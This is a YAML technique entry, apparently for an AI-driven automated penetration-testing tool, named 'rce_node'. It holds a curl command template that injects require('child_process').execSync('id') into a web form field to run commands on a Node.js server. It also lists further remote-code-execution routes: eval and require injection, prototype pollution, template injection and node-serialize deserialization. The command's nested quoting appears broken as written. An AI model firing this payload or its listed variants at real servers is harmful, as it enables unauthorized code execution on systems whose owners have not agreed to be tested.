name: rce_node
category: web
description: Node.js RCE techniques
preconditions:
  - service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: "curl -s '{target_url}' -d 'input=require("child_process").execSync("id").toString()'"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Node.js RCE: eval() injection, require() injection, prototype pollution → RCE, template injection (Pug/EJS/Nunjucks), deserialization (node-serialize)."
